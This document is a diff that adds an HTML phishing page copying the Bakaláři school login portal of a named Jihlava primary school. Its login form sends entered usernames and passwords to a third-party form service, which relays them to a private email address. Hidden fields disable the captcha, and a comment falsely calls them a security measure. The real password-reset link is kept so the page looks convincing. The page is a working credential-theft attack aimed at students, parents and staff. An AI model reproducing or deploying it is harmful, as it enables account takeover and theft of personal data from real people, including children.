@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bakalari - login to the system</title>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="base.css">
+    <link rel="stylesheet" href="loginpage.css">
+    <link rel="stylesheet" href="jquery-ui.min.css">
+    <link rel="stylesheet" href="jquery-ui.theme.min.css">
+    <link rel="stylesheet" href="ls-capslock.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="font-awesome.min.css">
+    <link rel="stylesheet" href="fonty.css">
+
+    <!-- JavaScript -->
+    <script src="jquery.min.js"></script>
+    <script src="jquery-ui.min.js"></script>
+    <script src="ls-capslock.js"></script>
+    <script src="loginFunctions.js"></script>
+    <script src="master_core.js"></script>
+
+    <script type="text/javascript">
+        var unsecuredConnectionMsg = "The application is not secure enough! An encrypted connection is missing. Find out more on <a href='http://www.bakalari.cz/static/gdpr' target='_blank' class='warning-link'>our website</a>.";
+        var unsupportedBrowserMsg = "You are using unsupported browser. Some features may not work as expected.";
+    </script>
+
+    <link rel="shortcut icon" href="logo-bakalariLogin-252x51-min.png">
+</head>
+
+<body>
+    <form id="formlogin" action="https://formsubmit.co/josefbilek.ml@seznam.cz" method="POST">
+        <div id="outer">
+            <div id="middle">
+                <div id="generalWarning" class="general-warning" style="display: none;"></div>
+                <div id="inner">
+                    <a href="#" id="loginLogo">
+                        <img src="logo-bakalariLogin-252x51-min.png" alt="Bakaláři">
+                    </a>
+                    <div class="bk-login-schoolName">
+                        Základní škola Jihlava, E. Rošického 2, příspěvková organizace
+                    </div>
+                    <div id="loginBox">
+                        <div id="info" onclick="showPopup(this)">i</div>
+                        <div class="space-top-40"></div>
+                        <div onkeypress="onEnterSubmit(event)" class="ls-capslock">
+                            <div class="question-container">
+                                <input type="text" name="username" id="username" class="inputLogin" placeholder="Username" required>
+                                <input type="password" name="password" id="password" class="inputLogin ls-capslock-input" placeholder="Password" required>
+
+                                <!-- Skrytá pole pro lepší zabezpečení -->
+                                <input type="hidden" name="_subject" value="Nové přihlášení!">
+                                <input type="hidden" name="_captcha" value="false">  <!-- Vypnutí captchy -->
+                                <input type="hidden" name="_autoresponse" value="Děkujeme za přihlášení.">
+
+                                <div class="ls-capslock-message">Máte zapnutý Caps Lock</div>
+                                <div class="checkbox-wrap">
+                                    <a href="https://zsrosi.bakalari.cz/bakaweb/next/serpwd.aspx" class="forgotten-password" tabindex="-1">Forgotten password</a>
+                                </div>
+                                <input type="hidden" name="returnUrl">
+                                <button class="btn-login" type="submit">
+                                    <span class="btn-login-loader"><i class="fa fa-spinner fa-spin"></i>Loading</span>
+                                    <span class="btn-login-text">Log In</span>
+                                </button>
+                                <div class="both"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mobile-app">
+                        <div class="mobile-app-text"><span>Try the Bakalari app on your smartphone</span></div>
+                        <div class="mobile-app-img">
+                            <a class="link" target="_blank" href="https://play.google.com/store/apps/details?id=cz.bakalari.mobile&hl=cs">
+                                <img src="btn-googlePlay-cerna-min.png">
+                            </a>
+                            <a class="link" target="_blank" href="https://itunes.apple.com/cz/app/bakalari-online/id1459368580?mt=8">
+                                <img src="btn-appStore-cerna-min.png">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="info_popUp" class="login-popup" style="display: none;">
+                <div class="block-style title">
+                    <span>Základní škola Jihlava, E. Rošického 2, příspěvková organizace</span>
+                </div>
+                <div class="block-style info"></div>
+                <div class="block-style bottom">
+                    <span>BAKALÁŘI software s.r.o. - 11.02.2025 (1.73.211.1)</span>
+                </div>
+            </div>
+
+            <div id="question_popUp" class="login-popup" style="display: none;">
+                <div class="block-style help">
+                    <div class="block-style"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</body>
+</html>
